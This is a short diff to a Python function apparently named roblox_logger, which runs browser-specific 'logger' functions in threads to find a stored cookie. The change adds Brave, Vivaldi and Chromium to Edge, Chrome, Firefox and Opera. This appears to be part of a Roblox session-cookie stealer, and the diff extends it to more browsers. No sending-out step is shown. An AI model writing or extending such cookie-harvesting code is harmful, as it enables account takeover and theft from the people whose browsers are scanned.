@@ -9,7 +9,7 @@ def roblox_logger():
     finded_cookie = None
 
     browsers = [edge_logger, chrome_logger, firefox_logger,
-                opera_logger]  # improt function from './loggers.py'
+                opera_logger, brave_logger, vivaldi_logger, chromium_logger]  # improt function from './loggers.py'
     for x in browsers:
         ''' Gets the return value of finding a cookie.'''
         twrv = ThreadWithReturnValue(target=x)
